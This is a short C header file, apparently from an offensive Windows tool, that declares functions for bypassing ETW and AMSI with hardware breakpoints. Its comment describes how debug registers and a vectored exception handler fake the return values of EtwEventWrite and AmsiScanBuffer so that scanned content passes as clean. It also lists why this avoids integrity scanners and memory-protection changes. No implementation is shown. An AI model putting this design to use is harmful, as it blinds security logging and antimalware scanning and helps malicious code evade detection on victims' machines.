#pragma once
#include <windows.h>

/*
 * HWBP ETW + AMSI bypass using hardware breakpoints (debug registers).
 *
 * Dr0 = EtwEventWrite   -> VEH returns RAX=0 (STATUS_SUCCESS), skip call
 * Dr1 = AmsiScanBuffer  -> VEH returns RAX=E_INVALIDARG, AMSI sees "clean"
 * Dr2 = AmsiScanString  -> same
 *
 * Advantage over 0xC3 patch:
 *   - No memory write to ntdll/amsi.dll .text -> no integrity-scanner hit
 *   - No VirtualProtect(PAGE_EXECUTE_READWRITE) on system DLL pages
 *   - Idempotent: safe to call multiple times
 *
 * hwbp_apply_thread() propagates active BPs to another thread handle.
 */

void hwbp_patch_etw(void);
void hwbp_patch_amsi(void);
void hwbp_patch_all(void);
void hwbp_apply_thread(HANDLE hThread);
